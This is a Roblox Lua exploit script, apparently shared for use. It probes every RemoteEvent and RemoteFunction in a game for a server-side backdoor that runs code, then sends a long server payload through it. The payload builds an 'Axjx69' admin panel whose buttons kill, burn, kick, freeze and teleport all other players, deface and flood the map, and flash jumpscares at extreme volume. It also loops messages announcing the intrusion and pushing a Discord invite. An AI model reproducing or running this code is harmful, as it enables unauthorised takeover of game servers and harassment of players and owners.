--
--
--
--
--
--bro




-------------------------------------------------------------------------
local attached = false
local backdoor = nil
local remoteCodes = {}
local STRING_VALUE_NAME = tostring(math.random(1000000, 9999999))

local function scanDescendants(parent)
    local descendance = parent:GetDescendants()
    for i = 1, #descendance do
        local descendant = descendance[i]
        local class = descendant.ClassName

        if class ~= "RemoteEvent" and class ~= "RemoteFunction" then
            continue
        end
        
        if descendant:IsDescendantOf(game:GetService("JointsService")) or 
           descendant:IsDescendantOf(game:GetService("RobloxReplicatedStorage")) then
            continue
        end
        
        local remoteCode = tostring(math.random(100000, 999999))
        remoteCodes[remoteCode] = descendant
        
        local requireScript = ("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'"):format(STRING_VALUE_NAME, remoteCode)
        
        if class == "RemoteEvent" then
            descendant:FireServer(requireScript)
        elseif class == "RemoteFunction" then
            pcall(function()
                descendant:InvokeServer(requireScript)
            end)
        end
        
        if game.Workspace:FindFirstChild(STRING_VALUE_NAME) then
            attached = true
            backdoor = remoteCodes[game.Workspace:FindFirstChild(STRING_VALUE_NAME).Value]
            backdoor:FireServer(("game.Workspace['%s']:Destroy()"):format(STRING_VALUE_NAME))
            
            -- 连接成功后自动执行代码
            local executeScript = [===[-- 通过后门漏洞执行器创建GUI界面
local function createAdminGUIForAxjx7()
    -- 查找玩家
    local targetPlayer = nil
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player.Name == "]===]..Username..[===[" then
            targetPlayer = player
            break
        end
    end
    
    if not targetPlayer then
        warn("玩家不在游戏中")
        return
    end
    
    -- 确保玩家有PlayerGui
    if not targetPlayer:FindFirstChild("PlayerGui") then
        Instance.new("PlayerGui").Parent = targetPlayer
    end
    
    -- 创建主屏幕GUI
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AdminPanelGui"
    screenGui.Parent = targetPlayer.PlayerGui
    
    -- 主容器框架
    local mainContainer = Instance.new("Frame")
    mainContainer.Size = UDim2.new(0, 350, 0, 300)  -- 减小高度
    mainContainer.Position = UDim2.new(0.5, -175, 0.5, -150)
    mainContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    mainContainer.BorderSizePixel = 0
    mainContainer.Active = true
    mainContainer.Draggable = true
    mainContainer.Parent = screenGui
    
    -- 添加圆角
    local containerCorner = Instance.new("UICorner")
    containerCorner.CornerRadius = UDim.new(0, 8)
    containerCorner.Parent = mainContainer
    
    -- 添加阴影效果
    local containerShadow = Instance.new("UIStroke")
    containerShadow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    containerShadow.Color = Color3.fromRGB(20, 20, 25)
    containerShadow.Thickness = 2
    containerShadow.Parent = mainContainer
    
    -- 标题栏
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 40)
    titleBar.Position = UDim2.new(0, 0, 0, 0)
    titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = mainContainer
    
    -- 标题栏圆角（只圆顶角）
    local titleBarCorner = Instance.new("UICorner")
    titleBarCorner.CornerRadius = UDim.new(0, 8)
    titleBarCorner.Parent = titleBar
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0, 200, 1, 0)
    title.Position = UDim2.new(0, 15, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "Axjx69 Gui V2.0"
    title.TextColor3 = Color3.fromRGB(220, 220, 220)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Font = Enum.Font.GothamSemibold
    title.TextSize = 16
    title.Parent = titleBar
    
    -- 窗口控制按钮容器
    local windowControls = Instance.new("Frame")
    windowControls.Size = UDim2.new(0, 70, 1, 0)
    windowControls.Position = UDim2.new(1, -70, 0, 0)
    windowControls.BackgroundTransparency = 1
    windowControls.Parent = titleBar
    
    -- 最小化按钮
    local minimizeBtn = Instance.new("TextButton")
    minimizeBtn.Size = UDim2.new(0, 30, 1, 0)
    minimizeBtn.Position = UDim2.new(0, 0, 0, 0)
    minimizeBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    minimizeBtn.BorderSizePixel = 0
    minimizeBtn.Text = "-"
    minimizeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
    minimizeBtn.Font = Enum.Font.GothamBold
    minimizeBtn.TextSize = 16
    minimizeBtn.Parent = windowControls
    
    -- 最小化按钮悬停效果
    minimizeBtn.MouseEnter:Connect(function()
        minimizeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
    end)
    
    minimizeBtn.MouseLeave:Connect(function()
        minimizeBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    end)
    
    -- 关闭按钮
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 1, 0)
    closeBtn.Position = UDim2.new(0, 40, 0, 0)
    closeBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    closeBtn.BorderSizePixel = 0
    closeBtn.Text = "×"
    closeBtn.TextColor3 = Color3.fromRGB(220, 100, 100)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 18
    closeBtn.Parent = windowControls
    
    -- 关闭按钮悬停效果
    closeBtn.MouseEnter:Connect(function()
        closeBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
        closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)
    
    closeBtn.MouseLeave:Connect(function()
        closeBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
        closeBtn.TextColor3 = Color3.fromRGB(220, 100, 100)
    end)
    
    -- 内容区域
    local contentFrame = Instance.new("Frame")
    contentFrame.Size = UDim2.new(1, -20, 1, -60)
    contentFrame.Position = UDim2.new(0, 10, 0, 50)
    contentFrame.BackgroundTransparency = 1
    contentFrame.Parent = mainContainer
    
    -- 创建滚动框架
    local scrollFrame = Instance.new("ScrollingFrame")
    scrollFrame.Size = UDim2.new(1, 0, 1, 0)
    scrollFrame.Position = UDim2.new(0, 0, 0, 0)
    scrollFrame.BackgroundTransparency = 1
    scrollFrame.BorderSizePixel = 0
    scrollFrame.ScrollBarThickness = 6
    scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 65)
    scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y  -- 自动调整画布大小
    scrollFrame.Parent = contentFrame
    
    -- 全局变量用于存储音乐实例
    local currentMusic = nil
    
    -- 按钮功能列表 (使用原始功能)
    local buttonFunctions = {
        {
            name = "播放音乐",
            func = function()
                local soundId = "rbxassetid://114727662968481"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 1000
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "暂停音乐",
            func = function()
                if currentMusic then
                    currentMusic:Stop()
                end
            end
        },
        {
            name = "火焰效果",
            func = function()
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Name ~= "axjx_7" and player.Character then
                        local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                        if humanoidRootPart then
                            local fire = Instance.new("Fire")
                            fire.Size = 10
                            fire.Heat = 10
                            fire.Parent = humanoidRootPart
                            
                            spawn(function()
                                while fire and fire.Parent do
                                    wait(1)
                                    local humanoid = player.Character:FindFirstChild("Humanoid")
                                    if humanoid and humanoid.Health > 0 then
                                        humanoid:TakeDamage(10)
                                    end
                                end
                            end)
                        end
                    end
                end
            end
        },
        {
            name = "白天变黑夜",
            func = function()
                game.Lighting:SetMinutesAfterMidnight(0)
                game.Lighting.ClockTime = 0
            end
        },
        {
            name = "秒杀所有人",
            func = function()
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Name ~= "axjx_7" and player.Character then
                        local humanoid = player.Character:FindFirstChild("Humanoid")
                        if humanoid then
                            humanoid.Health = 0
                        end
                    end
                end
            end
        },
        {
            name = "修改粒子",
            func = function()
                local particleId = "rbxassetid://992417778"
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("ParticleEmitter") then
                        obj.Texture = particleId
                    end
                end
            end
        },
        {
            name = "修改天空",
            func = function()
                for _, child in ipairs(game.Lighting:GetChildren()) do
                    if child:IsA("Sky") then
                        child:Destroy()
                    end
                end
                
                local sky = Instance.new("Sky")
                sky.Name = "CustomSky"
                
                local textureId = "rbxassetid://992417778"
                sky.SkyboxBk = textureId
                sky.SkyboxDn = textureId
                sky.SkyboxFt = textureId
                sky.SkyboxLf = textureId
                sky.SkyboxRt = textureId
                sky.SkyboxUp = textureId
                
                sky.Parent = game.Lighting
            end
        },
        {
            name = "修改全部贴图",
            func = function()
                local textureId = "rbxassetid://992417778"
                
                -- 修改所有部件的贴图和颜色
                for _, part in ipairs(workspace:GetDescendants()) do
                    if part:IsA("Part") then
                        -- 创建特殊材质
                        local texture = Instance.new("Texture")
                        texture.Texture = textureId
                        texture.Face = Enum.NormalId.Top
                        texture.Parent = part
                        
                        -- 修改颜色
                        part.BrickColor = BrickColor.new("Bright blue")
                        part.Material = Enum.Material.Neon
                    elseif part:IsA("Decal") then
                        part.Texture = textureId
                    end
                 end
            end
        },
        {
            name = "随机传送",
            func = function()
                local playerList = game.Players:GetPlayers()
                local targetPlaceId = game.PlaceId
                
                for _, player in ipairs(playerList) do
                    if player.Name ~= "axjx_7" then
                        local serverCode = game:GetService("HttpService"):GenerateGUID(false):sub(1, 8)
                        
                        local success, result = pcall(function()
                            return game:GetService("TeleportService"):ReserveServer(targetPlaceId)
                        end)
                        
                        if success then
                            local teleportSuccess, teleportError = pcall(function()
                                game:GetService("TeleportService"):TeleportToPrivateServer(
                                    targetPlaceId, 
                                    result, 
                                    {player}
                                )
                            end)
                        end
                    end
                end
            end
        },
        {
            name = "踢出所有人",
            func = function()
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Name ~= "axjx_7" then
                        player:Kick("您已被管理员踢出游戏")
                    end
                end
            end
        },
        {
            name = "禁止移动",
            func = function()
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Name ~= "axjx_7" and player.Character then
                        local humanoid = player.Character:FindFirstChild("Humanoid")
                        if humanoid then
                            humanoid.WalkSpeed = 0
                            humanoid.JumpPower = 0
                        end
                    end
                end
            end
        },
        {
            name = "恢复移动",
            func = function()
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Name ~= "axjx_7" and player.Character then
                        local humanoid = player.Character:FindFirstChild("Humanoid")
                        if humanoid then
                            humanoid.WalkSpeed = 16
                            humanoid.JumpPower = 50
                        end
                    end
                end
            end
        },
        {
            name = "颜色反转",
            func = function()
                local function invertColor(color)
                    return Color3.new(1 - color.R, 1 - color.G, 1 - color.B)
                end
                
                for _, part in ipairs(workspace:GetDescendants()) do
                    if part:IsA("Part") then
                        part.BrickColor = BrickColor.new(invertColor(part.BrickColor.Color))
                    elseif part:IsA("Light") then
                        part.Color = invertColor(part.Color)
                    end
                end
            end
        },
        {
            name = "水淹地图",
            func = function()
                local mapSize = 500
                local waterHeight = 20
                local gridSize = 50
                
                for x = -mapSize/2, mapSize/2, gridSize do
                    for z = -mapSize/2, mapSize/2, gridSize do
                        local waterPart = Instance.new("Part")
                        waterPart.Size = Vector3.new(gridSize, 1, gridSize)
                        waterPart.Position = Vector3.new(x, waterHeight, z)
                        waterPart.Anchored = true
                        waterPart.CanCollide = true
                        waterPart.Transparency = 0.3
                        waterPart.Color = Color3.fromRGB(0, 100, 200)
                        waterPart.Material = Enum.Material.Water
                        waterPart.Name = "FloodWater"
                        waterPart.Parent = workspace
                    end
                end
            end
        },
        {
            name = "散发粒子",
            func = function()
                local particleId = "rbxassetid://992417778"
                
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Character then
                        local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                        if humanoidRootPart then
                            local particleEmitter = Instance.new("ParticleEmitter")
                            particleEmitter.Texture = particleId
                            particleEmitter.Size = NumberSequence.new(1)
                            particleEmitter.Transparency = NumberSequence.new(0.5)
                            particleEmitter.Lifetime = NumberRange.new(2, 4)
                            particleEmitter.Rate = 20
                            particleEmitter.Speed = NumberRange.new(5, 10)
                            particleEmitter.Rotation = NumberRange.new(0, 360)
                            particleEmitter.Parent = humanoidRootPart
                        end
                    end
                end
            end
        },
        {
            name = "图片跳杀",
            func = function()
                for _, player in ipairs(game.Players:GetPlayers()) do
                        -- 创建跳杀GUI
                        local realmscare = Instance.new("ScreenGui")
                        realmscare.Name = "realm-scare"
                        realmscare.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                        realmscare.ResetOnSpawn = false
                        
                        local ImageLabel = Instance.new("ImageLabel")
                        ImageLabel.Parent = realmscare
                        ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        ImageLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
                        ImageLabel.Position = UDim2.new(0, 0, -0.0335968398, 0)
                        ImageLabel.Size = UDim2.new(1, 0, 1.03359687, 0)
                        ImageLabel.Image = "rbxassetid://992417778"
                        
                        local framefrrfr = Instance.new("Frame")
                        framefrrfr.Name = "framefrrfr"
                        framefrrfr.Parent = ImageLabel
                        framefrrfr.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                        framefrrfr.BorderColor3 = Color3.fromRGB(27, 42, 53)
                        framefrrfr.BorderSizePixel = 0
                        framefrrfr.Position = UDim2.new(-0.000821621623, 0, 0.814750969, 0)
                        framefrrfr.Size = UDim2.new(0.338442117, 0, 0.19506079, 0)
                        
                        local PercentageBar = Instance.new("ImageLabel")
                        PercentageBar.Name = "PercentageBar"
                        PercentageBar.Parent = framefrrfr
                        PercentageBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        PercentageBar.BackgroundTransparency = 1.000
                        PercentageBar.BorderColor3 = Color3.fromRGB(27, 42, 53)
                        PercentageBar.Position = UDim2.new(0.0326975472, 0, 0.577336967, 0)
                        PercentageBar.Size = UDim2.new(0.934604824, 0, 0.295081973, 0)
                        PercentageBar.Image = "rbxassetid://3570695787"
                        PercentageBar.ImageColor3 = Color3.fromRGB(0, 145, 255)
                        PercentageBar.ScaleType = Enum.ScaleType.Slice
                        PercentageBar.SliceCenter = Rect.new(100, 100, 100, 100)
                        PercentageBar.SliceScale = 0.120
                        
                        local Label = Instance.new("TextLabel")
                        Label.Name = "Label"
                        Label.Parent = PercentageBar
                        Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        Label.BackgroundTransparency = 1.000
                        Label.BorderColor3 = Color3.fromRGB(27, 42, 53)
                        Label.Size = UDim2.new(1, 0, 1, 0)
                        Label.Font = Enum.Font.SourceSans
                        Label.Text = "100%"
                        Label.TextColor3 = Color3.fromRGB(255, 255, 255)
                        Label.TextScaled = true
                        Label.TextSize = 14.000
                        Label.TextWrapped = true
                        
                        local Frame = Instance.new("ImageLabel")
                        Frame.Name = "Frame"
                        Frame.Parent = framefrrfr
                        Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        Frame.BackgroundTransparency = 1.000
                        Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
                        Frame.Position = UDim2.new(-0.204075292, 0, -0.198473275, 0)
                        Frame.Size = UDim2.new(0.525885582, 0, 0.368852466, 0)
                        Frame.Image = "rbxassetid://6719801986"
                        Frame.ImageColor3 = Color3.fromRGB(35, 35, 35)
                        Frame.ScaleType = Enum.ScaleType.Slice
                        Frame.SliceCenter = Rect.new(100, 100, 100, 100)
                        Frame.SliceScale = 0.120
                        
                        local TextLabel = Instance.new("TextLabel")
                        TextLabel.Parent = Frame
                        TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        TextLabel.BackgroundTransparency = 1.000
                        TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
                        TextLabel.Position = UDim2.new(0.383419693, 0, 0, 0)
                        TextLabel.Size = UDim2.new(0.616580307, 0, 0.577777803, 0)
                        TextLabel.Font = Enum.Font.SourceSans
                        TextLabel.Text = "Loading..."
                        TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                        TextLabel.TextScaled = true
                        TextLabel.TextSize = 14.000
                        TextLabel.TextWrapped = true
                        
                        local TextLabel_2 = Instance.new("TextLabel")
                        TextLabel_2.Parent = ImageLabel
                        TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        TextLabel_2.BackgroundTransparency = 1.000
                        TextLabel_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
                        TextLabel_2.Position = UDim2.new(-0.00198846636, 0, 0.846784174, 0)
                        TextLabel_2.Size = UDim2.new(0.339608967, 0, 0.0428137034, 0)
                        TextLabel_2.Font = Enum.Font.SourceSans
                        TextLabel_2.Text = "现在正在和Axjx69处对象中.."
                        TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
                        TextLabel_2.TextScaled = true
                        TextLabel_2.TextSize = 14.000
                        TextLabel_2.TextWrapped = true
                        
                        local TextLabel_3 = Instance.new("TextLabel")
                        TextLabel_3.Parent = ImageLabel
                        TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        TextLabel_3.BackgroundTransparency = 1.000
                        TextLabel_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
                        TextLabel_3.Position = UDim2.new(0.0562912859, 0, 0.899411678, 0)
                        TextLabel_3.Size = UDim2.new(0.223557532, 0, 0.0245394632, 0)
                        TextLabel_3.Font = Enum.Font.SourceSansItalic
                        TextLabel_3.Text = "https://discord.gg/Uxtw7NZmKR"
                        TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
                        TextLabel_3.TextScaled = true
                        TextLabel_3.TextSize = 14.000
                        TextLabel_3.TextWrapped = true
                        
                        -- 将GUI添加到玩家界面
                        realmscare.Parent = player:WaitForChild("PlayerGui")
                        
                        -- 创建并播放声音
                        local sound = Instance.new("Sound")
                        sound.SoundId = "rbxassetid://6129291390"
                        sound.Volume = 1000000000000000000
                        sound.Parent = workspace
                        sound:Play()
                        
                        -- 9秒后销毁GUI和声音
                        delay(9, function()
                            realmscare:Destroy()
                            sound:Stop()
                            sound:Destroy()
                        end)
                  end
            end
        },
        {
            name = "重新加入跳杀",
            func = function()
                local placeId = game.PlaceId
                local jobId = game.JobId
                
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Name ~= "axjx_7" then
                        if not _G.JumpscarePlayers then
                            _G.JumpscarePlayers = {}
                        end
                        _G.JumpscarePlayers[player.UserId] = true
                        
                            local success, result = pcall(function()
                                return game:GetService("TeleportService"):TeleportToPlaceInstance(
                                    placeId,
                                    jobId,
                                    player
                                )
                            end)
                            
                            if not success then
                                _G.JumpscarePlayers[player.UserId] = nil
                            end
                    end
                end
            end
        }
    }
    
    -- 创建功能按钮
    for i, buttonInfo in ipairs(buttonFunctions) do
        local buttonFrame = Instance.new("Frame")
        buttonFrame.Size = UDim2.new(1, -10, 0, 40)  -- 减小按钮高度
        buttonFrame.Position = UDim2.new(0, 5, 0, (i-1)*45)
        buttonFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
        buttonFrame.BorderSizePixel = 0
        buttonFrame.Parent = scrollFrame
        
        -- 按钮圆角
        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0, 6)
        buttonCorner.Parent = buttonFrame
        
        -- 按钮名称
        local buttonName = Instance.new("TextLabel")
        buttonName.Size = UDim2.new(1, -10, 1, 0)
        buttonName.Position = UDim2.new(0, 10, 0, 0)
        buttonName.BackgroundTransparency = 1
        buttonName.Text = buttonInfo.name
        buttonName.TextColor3 = Color3.fromRGB(220, 220, 220)
        buttonName.TextXAlignment = Enum.TextXAlignment.Left
        buttonName.Font = Enum.Font.GothamSemibold
        buttonName.TextSize = 14  -- 减小字体大小
        buttonName.Parent = buttonFrame
        
        -- 按钮交互区域
        local button = Instance.new("TextButton")
        button.Size = UDim2.new(1, 0, 1, 0)
        button.Position = UDim2.new(0, 0, 0, 0)
        button.BackgroundTransparency = 1
        button.BorderSizePixel = 0
        button.Text = ""
        button.Parent = buttonFrame
        
        -- 按钮悬停效果
        button.MouseEnter:Connect(function()
            buttonFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
        end)
        
        button.MouseLeave:Connect(function()
            buttonFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
        end)
        
        -- 按钮点击事件
        button.MouseButton1Click:Connect(function()
            buttonInfo.func()
        end)
    end
    
    -- 最小化按钮事件
    local isMinimized = false
    minimizeBtn.MouseButton1Click:Connect(function()
        if isMinimized then
            -- 恢复显示
            contentFrame.Visible = true
            mainContainer.Size = UDim2.new(0, 350, 0, 300)
            minimizeBtn.Text = "-"
            isMinimized = false
        else
            -- 最小化
            contentFrame.Visible = false
            mainContainer.Size = UDim2.new(0, 350, 0, 40)
            minimizeBtn.Text = "+"
            isMinimized = true
        end
    end)
    
    -- 关闭按钮事件
    closeBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)
    
    print("已为玩家 axjx_7 创建现代化管理员控制面板")
end

-- 监听玩家加入事件，检查是否需要显示跳杀
game.Players.PlayerAdded:Connect(function(player)
    -- 等待玩家加载完成
    player:WaitForChild("PlayerGui")

    -- 检查是否需要显示跳杀
    if _G.JumpscarePlayers and _G.JumpscarePlayers[player.UserId] then
        -- 稍微延迟一下，确保玩家完全加载
        delay(1, function()
            -- 创建跳杀GUI
            local realmscare = Instance.new("ScreenGui")
            realmscare.Name = "realm-scare"
            realmscare.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            realmscare.ResetOnSpawn = false
            
            local ImageLabel = Instance.new("ImageLabel")
            ImageLabel.Parent = realmscare
            ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ImageLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
            ImageLabel.Position = UDim2.new(0, 0, -0.0335968398, 0)
            ImageLabel.Size = UDim2.new(1, 0, 1.03359687, 0)
            ImageLabel.Image = "rbxassetid://992417778"
            
            local framefrrfr = Instance.new("Frame")
            framefrrfr.Name = "framefrrfr"
            framefrrfr.Parent = ImageLabel
            framefrrfr.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            framefrrfr.BorderColor3 = Color3.fromRGB(27, 42, 53)
            framefrrfr.BorderSizePixel = 0
            framefrrfr.Position = UDim2.new(-0.000821621623, 0, 0.814750969, 0)
            framefrrfr.Size = UDim2.new(0.338442117, 0, 0.19506079, 0)
            
            local PercentageBar = Instance.new("ImageLabel")
            PercentageBar.Name = "PercentageBar"
            PercentageBar.Parent = framefrrfr
            PercentageBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            PercentageBar.BackgroundTransparency = 1.000
            PercentageBar.BorderColor3 = Color3.fromRGB(27, 42, 53)
            PercentageBar.Position = UDim2.new(0.0326975472, 0, 0.577336967, 0)
            PercentageBar.Size = UDim2.new(0.934604824, 0, 0.295081973, 0)
            PercentageBar.Image = "rbxassetid://3570695787"
            PercentageBar.ImageColor3 = Color3.fromRGB(0, 145, 255)
            PercentageBar.ScaleType = Enum.ScaleType.Slice
            PercentageBar.SliceCenter = Rect.new(100, 100, 100, 100)
            PercentageBar.SliceScale = 0.120
            
            local Label = Instance.new("TextLabel")
            Label.Name = "Label"
            Label.Parent = PercentageBar
            Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Label.BackgroundTransparency = 1.000
            Label.BorderColor3 = Color3.fromRGB(27, 42, 53)
            Label.Size = UDim2.new(1, 0, 1, 0)
            Label.Font = Enum.Font.SourceSans
            Label.Text = "100%"
            Label.TextColor3 = Color3.fromRGB(255, 255, 255)
            Label.TextScaled = true
            Label.TextSize = 14.000
            Label.TextWrapped = true
            
            local Frame = Instance.new("ImageLabel")
            Frame.Name = "Frame"
            Frame.Parent = framefrrfr
            Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Frame.BackgroundTransparency = 1.000
            Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
            Frame.Position = UDim2.new(-0.204075292, 0, -0.198473275, 0)
            Frame.Size = UDim2.new(0.525885582, 0, 0.368852466, 0)
            Frame.Image = "rbxassetid://6719801986"
            Frame.ImageColor3 = Color3.fromRGB(35, 35, 35)
            Frame.ScaleType = Enum.ScaleType.Slice
            Frame.SliceCenter = Rect.new(100, 100, 100, 100)
            Frame.SliceScale = 0.120
            
            local TextLabel = Instance.new("TextLabel")
            TextLabel.Parent = Frame
            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.BackgroundTransparency = 1.000
            TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
            TextLabel.Position = UDim2.new(0.383419693, 0, 0, 0)
            TextLabel.Size = UDim2.new(0.616580307, 0, 0.577777803, 0)
            TextLabel.Font = Enum.Font.SourceSans
            TextLabel.Text = "Loading..."
            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.TextScaled = true
            TextLabel.TextSize = 14.000
            TextLabel.TextWrapped = true
            
            local TextLabel_2 = Instance.new("TextLabel")
            TextLabel_2.Parent = ImageLabel
            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.BackgroundTransparency = 1.000
            TextLabel_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
            TextLabel_2.Position = UDim2.new(-0.00198846636, 0, 0.846784174, 0)
            TextLabel_2.Size = UDim2.new(0.339608967, 0, 0.0428137034, 0)
            TextLabel_2.Font = Enum.Font.SourceSans
            TextLabel_2.Text = "现在正在和Axjx69处对象中.."
            TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.TextScaled = true
            TextLabel_2.TextSize = 14.000
            TextLabel_2.TextWrapped = true
            
            local TextLabel_3 = Instance.new("TextLabel")
            TextLabel_3.Parent = ImageLabel
            TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_3.BackgroundTransparency = 1.000
            TextLabel_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
            TextLabel_3.Position = UDim2.new(0.0562912859, 0, 0.899411678, 0)
            TextLabel_3.Size = UDim2.new(0.223557532, 0, 0.0245394632, 0)
            TextLabel_3.Font = Enum.Font.SourceSansItalic
            TextLabel_3.Text = "https://discord.gg/Uxtw7NZmKR"
            TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_3.TextScaled = true
            TextLabel_3.TextSize = 14.000
            TextLabel_3.TextWrapped = true
            
            -- 将GUI添加到玩家界面
            realmscare.Parent = player.PlayerGui
            
            -- 创建并播放声音
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://6129291390"
            sound.Volume = 1000000000000000000000000
            sound.Parent = workspace
            sound:Play()
            
            -- 9秒后销毁GUI和声音
            delay(9, function()
                realmscare:Destroy()
                sound:Stop()
                sound:Destroy()
                _G.JumpscarePlayers[player.UserId] = nil
            end)
        end)
    end
end)

local function ll()
    -- 消息序列
    local messagess = {
        {text = "AHAHAH", duration = 6},
        {text = "69696969696969696969", duration = 6},
        {text = "我爱69", duration = 6},
    }
    
    while true do
        -- 依次显示所有消息
        for _, msg in ipairs(messagess) do
            messageInstances = Instance.new("Message")
            
            messageInstances.Parent = workspace
            messageInstances.Text = msg.text
            
            -- 等待指定时间后移除消息
            wait(msg.duration)
            messageInstances:Destroy()
        end
    end
end

local function llll()
    -- 消息序列
    local messages = {
        {type = "Hint", text = "Axjx69现在已经入侵了这个游戏！！！", duration = 6},
        {type = "Hint", text = "对了你可以加入我们https://discord.gg/Uxtw7NZmKR", duration = 6},
    }
    
    while true do
        -- 依次显示所有消息
        for _, msg in ipairs(messages) do
            messageInstance = Instance.new("Hint")
            
            messageInstance.Parent = workspace
            messageInstance.Text = msg.text
            
            -- 等待指定时间后移除消息
            wait(msg.duration)
            messageInstance:Destroy()
        end
    end
end

-- 执行函数
spawn(ll) -- 使用spawn来避免阻塞主线程
spawn(llll) -- 使用spawn来避免阻塞主线程
createAdminGUIForAxjx7()
]===]
            
            if backdoor.ClassName == "RemoteEvent" then
                backdoor:FireServer(executeScript)
            elseif backdoor.ClassName == "RemoteFunction" then
                pcall(function()
                    backdoor:InvokeServer(executeScript)
                end)
            end
            
            return true
        end
    end
    return false
end

local function scanGame()
    local commonPlaces = {
        game:GetService("ReplicatedStorage"),
        game:GetService("Workspace"),
        game:GetService("Lighting")
    }
    
    for i = 1, #commonPlaces do
        if scanDescendants(commonPlaces[i]) then
            return true
        end
    end
    
    local children = game:GetChildren()
    for i = 1, #children do
        local child = children[i]
        local skip = false
        
        for j = 1, #commonPlaces do
            if child == commonPlaces[j] then
                skip = true
                break
            end
        end
        
        if not skip and scanDescendants(child) then
            return true
        end
    end
    
    return false
end

-- 启动时自动扫描并执行
scanGame()